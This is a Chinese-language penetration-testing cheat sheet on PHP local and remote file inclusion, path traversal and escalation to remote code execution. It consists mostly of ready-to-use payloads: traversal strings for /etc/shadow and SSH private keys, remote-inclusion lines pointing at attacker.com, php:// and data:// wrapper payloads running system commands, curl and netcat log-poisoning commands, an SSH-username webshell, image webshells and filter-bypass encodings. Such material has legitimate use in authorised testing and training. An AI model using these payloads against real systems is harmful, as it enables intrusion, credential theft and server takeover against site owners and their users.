# 文件包含 / 路径遍历实战参考

> 分类: LFI检测 → 路径遍历 → 日志投毒 → 伪协议 → Session文件 → /proc/self/environ → RCE

---

## 1. LFI / 路径遍历检测

### 1.1 基础检测

```bash
# === LFI (本地文件包含) ===
?page=../../../../etc/passwd
?page=../../../../etc/passwd%00           # 空字节截断 (PHP <5.3.4)
?page=....//....//....//....//etc/passwd  # 路径规范化绕过
?page=..%2f..%2f..%2f..%2fetc%2fpasswd   # URL编码
?page=..%252f..%252f..%252fetc%252fpasswd # 双重URL编码

# === Windows ===
?page=../../../../windows/win.ini
?page=../../../../boot.ini
?page=..\..\..\..\windows\win.ini

# === RFI (远程文件包含) ===
?page=http://attacker.com/shell.txt
?page=//attacker.com/share/shell.txt       # UNC路径
```

### 1.2 敏感文件速查

```bash
# === Linux ===
/etc/passwd
/etc/shadow
/root/.ssh/id_rsa
/var/log/apache2/access.log
/var/log/apache2/error.log
/proc/self/environ
/proc/self/fd/0
/var/www/html/config.php
/etc/php/7.4/apache2/php.ini

# === Windows ===
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
C:\Program Files\Apache Software Foundation\Tomcat\conf\server.xml
```

---

## 2. PHP 伪协议 (Wrapper)

### 2.1 常用伪协议

```php
# === php://filter (读源码) ===
# Base64 编码输出 → 防止 PHP 执行
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd

# 链式过滤器 (多重编码)
?page=php://filter/read=convert.base64-encode|convert.base64-encode/resource=index.php

# 字符串过滤 (rot13)
?page=php://filter/read=string.rot13/resource=index.php

# === php://input (POST 中带 PHP 代码) ===
# 需要 allow_url_include=On
POST /index.php?page=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('id');?>

# === php://fd ===
?page=php://fd/0     # 读取 stdin (当前请求body)

# === data:// (内联数据) ===
# 需要 allow_url_include=On
?page=data://text/plain,<?php system('id');?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# === expect:// (直接执行命令) ===
# 需要 expect 扩展
?page=expect://id
?page=expect://whoami

# === phar:// (Phar 反序列化) ===
?page=phar://uploaded_file.jpg/shell.php
```

### 2.2 伪协议绕过关键词过滤

```php
# php:// 被过滤 → 大小写或编码
?page=pHp://filter/...
?page=PhP://filter/...
?page=php://FilTer/...           # filter 大写绕过

# resource= 被过滤 → 使用 /resource= (双斜杠)
?page=php://filter/convert.base64-encode/resource=/etc/passwd

# flag/flag= 被过滤
?page=php://filter/convert.base64-encode/resource=/fl\ag
```

---

## 3. LFI → RCE 全链路

### 3.1 日志投毒 (Log Poisoning)

```bash
# === Apache access.log 投毒 ===
# Step1: 发起含 PHP 代码的请求
curl -H "User-Agent: <?php system('id');?>" http://target.com/
# 或用 netcat:
echo -e "GET /<?php system('id');?> HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

# Step2: 包含日志文件
?page=../../../../var/log/apache2/access.log

# 常见日志路径:
/var/log/apache2/access.log          # Debian/Ubuntu
/var/log/apache2/error.log
/var/log/httpd/access_log            # CentOS/RHEL
/var/log/httpd/error_log
/var/log/nginx/access.log            # Nginx
/var/log/nginx/error.log
/var/log/vsftpd.log                  # FTP
/var/log/sshd.log                    # SSH
/var/log/mail.log                    # Mail
/var/log/auth.log                    # Auth (Debian/Ubuntu)
/var/log/secure                      # Auth (CentOS/RHEL)
```

### 3.2 /proc/self/environ (进程环境注入)

```bash
# Step1: User-Agent 注入 PHP 代码
curl -H "User-Agent: <?php system('id');?>" http://target.com/index.php?page=/proc/self/environ

# 如果 User-Agent 被 WAF/IDS 检测 → 换其他 CGI 变量
```

### 3.3 Session 文件包含

```php
# PHP Session 文件路径:
/var/lib/php/sessions/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>

# Step1: 注册 session, 注入 PHP 代码
# 登录/注册页面 → 用户名填入: <?php system('id');?>
# 或通过 URL:
?PHPSESSID=../../../../tmp/sess_h4x0r

# Step2: 包含 session 文件
?page=../../../../var/lib/php/sessions/sess_<PHPSESSID>
```

### 3.4 文件上传 + LFI

```bash
# Step1: 上传图片马 (带 PHP 代码的合法图片)
# 文件名: evil.jpg 内容: GIF89a<?php system('id');?>
# Step2: LFI 包含:
?page=uploads/evil.jpg
# → PHP 代码被执行
```

### 3.5 SSH Auth Log 投毒

```bash
# Step1: SSH 登录, 用户名含 PHP 代码
ssh '<?php system($_GET[1]);?>'@target.com

# Step2: 包含 SSH 日志
?page=../../../../var/log/auth.log&1=id
# 或
?page=../../../../var/log/secure&1=id
```

### 3.6 Email Log 投毒

```bash
# 利用 SMTP 投毒 /var/log/mail.log
# 发邮件到目标服务器上的用户, 主题含 PHP 代码
# 包含 /var/log/mail.log
```

---

## 4. 路径遍历绕过

### 4.1 基础绕过

```bash
# ../ 被过滤 → 各种变体
....//                  → 过滤一次 ../ 后剩 ../
..;/
..%2f
%2e%2e%2f               # URL编码
%252e%252e%252f         # 双重URL编码
..%c0%af                # 宽字节截断
..%ef%bc%8f             # Unicode 全角斜线
# Windows:
..\
..%5c
..%255c
```

### 4.2 绝对路径限制绕过

```bash
# 必须 /var/www/html/ 开头
# → 路径规范化绕过
/var/www/html/../../../../etc/passwd
/var/www/html/..\..\..\..\etc\passwd   (Windows)
```

### 4.3 文件后缀限制绕过

```bash
# 必须 .php 结尾:
?page=../../../../etc/passwd%00.php         # 空字节截断
?page=../../../../etc/passwd/.              # 末尾 /.
?page=../../../../etc/passwd/               # 末尾 /
?page=../../../../etc/passwd%2500.php       # 双重编码空字节
?page=php://filter/convert.base64-encode/resource=index    # 不写后缀

# 在某些 PHP 版本, / 绕过后缀检查:
?page=../../../../etc/passwd/.
```

---

## 5. 特殊 LFI 技巧

### 5.1 /proc/ 文件系统

```bash
/proc/self/environ         # 环境变量 (可能含秘密)
/proc/self/fd/0            # stdin
/proc/self/fd/1            # stdout
/proc/self/fd/2            # stderr
/proc/self/cmdline         # 当前进程命令行
/proc/sched_debug          # 进程调度信息
/proc/mounts               # 挂载信息
/proc/net/arp              # ARP 表 (内网探测)
/proc/net/tcp              # TCP 连接
/proc/net/udp              # UDP 连接
/proc/net/fib_trie         # 路由表

# 注: /proc/self/fd 可能编号不同 → 有爆破空间
```

### 5.2 PHPInfo + LFI → 临时文件包含

```
条件:
1. 存在 phpinfo() 页面
2. 存在 LFI
3. PHP 允许文件上传 (即使上传功能不能用)

利用:
1. 发送含 PHP 代码的 multipart/form-data 请求到 phpinfo 页面
2. PHP 会创建临时文件 /tmp/phpXXXXXX → 在 phpinfo 输出中可见
3. 可见后立即用 LFI 包含临时文件 (竞争)
4. 得 RCE

工具: https://github.com/roughiz/lfito_rce
```

---

*参考: PayloadAllTheThings + HackTricks + 实战案例*
